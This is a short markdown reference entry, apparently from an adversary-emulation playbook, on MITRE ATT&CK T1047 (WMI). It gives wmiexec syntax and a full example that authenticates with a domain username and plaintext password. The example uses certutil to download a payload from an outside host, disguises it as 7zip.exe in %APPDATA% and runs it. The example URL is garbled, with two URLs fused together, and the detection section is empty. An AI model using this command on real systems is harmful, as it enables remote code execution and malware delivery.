# [Windows Managment Instrumentation](https://attack.mitre.org/techniques/T1047/)

## Exploit Syntax

Syntax:
```powershell 
wmiexec -t <ip> -u <domain.user> -d <domain.name> -p <password> -c "cmd"
```

Example:
```powershell 
wmiexec -t 172.25.47.2 -u aubrey.sandoval -d vcfed-int -p f7m.}K+s-h -c "cmd /c certutil.exe -urlcache -split -f http://downgradesystems.info/quhttp://10.10.254.1:46692/file-transfer/aspect-remind-lawestions/61882772/verify %APPDATA%\7zip.exe && %APPDATA%\7zip.exe"
```

## Detection Method

## Resources